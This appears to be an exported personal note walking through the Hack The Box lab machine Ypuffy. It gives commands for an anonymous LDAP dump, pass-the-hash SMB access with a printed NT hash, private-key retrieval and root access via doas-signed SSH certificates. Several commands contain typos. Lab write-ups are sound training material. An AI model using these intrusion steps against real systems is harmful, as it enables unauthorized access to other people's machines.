<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.107 Ypuffy</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.107 Ypuffy</h1><br/>nmap showed that ssh, http, smb, and ldap were open.<br />ssh version showed that it was probably a OpenBSD 6.3 machine<br />http could not be navigated to.<br />smb, I could not read dirs anonymously, but I could connect.<br />nmap -p 389 --script ldap-search -Pn 10.10.10.107   showed an allowed anonymouns bind could be made.<br />    also, the base namingcontexts was “DC=hackthebox,DC=htb”<br /><br />ldapsearch -h 10.10.10.107 -x -b &#39;DC=hackthebox,DC=htb&#39;     dumped the whole ldap db for me.<br />in the db I found a sambaNTPassword hash for alice1978<br />    0B186E661BBDBDCF6047784DE8B9FD8B<br />    <br />a credentialed smb map showed that I could read and write to the alice directory<br />    smbmap -H 10.10.10.107 -u alice1978 -p 0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B<br />    <br />a credentialed smbclient command enabled me to connect and pull off the single file in the share “my_private_key.ppk”<br />    smbclient -h &#39;\\10.10.10.107\alice&#39; -U alice1978 -W ypuffy.hackthebox.htb -l 10.10.10.107 --pw-nt-hash 0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B<br />    <br />.ppk files are putty private keys. I used puttygen (from putty-tools) to convert the key to openssh format so I can use it to ssh in!<br />    puttygen my_private_key.ppk -O private-openssh -o alice1978.pem<br />ssh successful and user flag!!!<br /><br />There is no sudo -l in OpenBSD so instead I cat&#39;ed the /etc/doas.conf and saw that I could run ssh-keygen as “userca”<br />I cheated like crazy to find the syntax, but the idea was that I could create ssh key-pair for root and then sign the public key with userca and then ssh into root that way.<br /><br />mkdir /tmp/yeet<br />cmod 777 yeet<br />cd /yeet<br />ssh-keygen<br />    point the key to /tmp/yeet/id_rsa<br />ls<br />    you will see that id_rsa and id_rsa.pub have been created<br />doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -n 3m3rgencyB4ckd00r -I root /tmp/yeet/id_rsa.pub<br />                                                        ^location of ca file    ^principal               ^username to principal^location<br />ls<br />    you will see that id_rse-cert.pub has also been created. this is a certificate signed by “userca” to authenticate id_rsa.pub<br />ssh -i id_rsa.pub root@localhost<br />    this will work because the public key is verified it will see that it is signed by the ca, meaning that it is authenticated and will allow login.</div></body></html>